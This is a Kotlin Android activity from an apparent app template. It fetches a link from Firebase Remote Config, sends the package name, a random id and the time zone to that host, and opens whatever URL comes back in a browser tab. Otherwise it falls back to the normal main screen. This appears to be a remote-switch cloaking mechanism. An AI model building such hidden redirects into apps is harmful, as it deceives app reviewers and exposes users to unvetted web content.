package com.template

import android.content.Intent
import android.graphics.Color
import android.net.Uri
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.browser.customtabs.CustomTabColorSchemeParams
import androidx.browser.customtabs.CustomTabsIntent
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.lifecycle.coroutineScope
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.template.ui.theme.Server_v1Theme
import com.template.ui.theme.StartScreen
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.InputStream
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.*


class LoadingActivity : ComponentActivity() {
    val showLoading: MutableStateFlow<Boolean> = MutableStateFlow(true)

    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        setContent {
            val isShow by showLoading.collectAsState()
            if (isShow) {
                Server_v1Theme {
                    StartScreen()
                }
            }
        }

        val savedHost = PrefManager.getUrl()
        if (savedHost == null && Utils.isNetworkAvailable()) {
            Log.e("LoadingActivity", "fetch")
            fetchConfig()
        } else if (!savedHost.isNullOrEmpty() && Utils.isNetworkAvailable()) {
            Log.e("LoadingActivity", "saved Host $savedHost")
            showLoading.value = false
            openCustomTab()
        } else {
            showLoading.value = false
            Log.e("LoadingActivity", "start main activity")
            startActivity(Intent(this, MainActivity::class.java))
        }
    }

    private fun fetchConfig() {
        val remoteConfig = Firebase.remoteConfig
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }
        remoteConfig.setConfigSettingsAsync(configSettings)
        Log.e("LoadingActivity", "start fetch")
        remoteConfig.fetchAndActivate()
            .addOnCanceledListener {
                Log.e("LoadingActivity", "")
            }
            .addOnCompleteListener(this) { task ->
                Log.e("LoadingActivity", "fetch $task")
                if (task.isSuccessful) {
                    val host: String = remoteConfig.getString("check_link")
                    Log.e("LoadingActivity", host)
                    if (host.isEmpty()) {
                        PrefManager.setUrl("")
                        startActivity(Intent(this, MainActivity::class.java))
                    } else {
                        val url =
                            "$host/?packageid=${this.packageName}&usserid=${UUID.randomUUID()}&getz=${TimeZone.getDefault().id}&getr=utm_source=google-play&utm_medium=organic"
                        lifecycle.coroutineScope.launch(Dispatchers.IO) {
                            val url2 = obtainUrl(url)
                            withContext(Dispatchers.Main) {
                                if (url2 == null) {
                                    startActivity(
                                        Intent(
                                            this@LoadingActivity,
                                            MainActivity::class.java
                                        )
                                    )
                                } else {
                                    openCustomTab()
                                }
                            }
                        }
                    }

                } else {
                    showLoading.value = false
                    PrefManager.setUrl("")
                    startActivity(Intent(this, MainActivity::class.java))
                }
            }
            .addOnFailureListener {
                Log.e("LoadingActivity", "err ${it.message}")
                PrefManager.setUrl("")
                startActivity(Intent(this, MainActivity::class.java))
            }
    }

    private fun openCustomTab() {
        val url = PrefManager.getUrl()
        Log.e("LoadingActivity", "$url")

        val defaultColors = CustomTabColorSchemeParams.Builder()
            .setToolbarColor(Color.BLACK)
            .build()
        val builder = CustomTabsIntent.Builder().setDefaultColorSchemeParams(defaultColors)

        builder.build().launchUrl(this, Uri.parse(url))
    }

    private suspend fun obtainUrl(host: String): String? {
        Log.e("url", host)

        val connection = URL(host).openConnection() as HttpURLConnection
        try {
            val data = connection.inputStream.bufferedReader().use { it.readText() }
            PrefManager.setUrl(data)
            return data
        } catch (e: Exception) {
            e.printStackTrace()
            PrefManager.setUrl("")
            Log.e("e.message", "${e.message}")
            return null
        } finally {
            connection.disconnect()
        }
    }
}
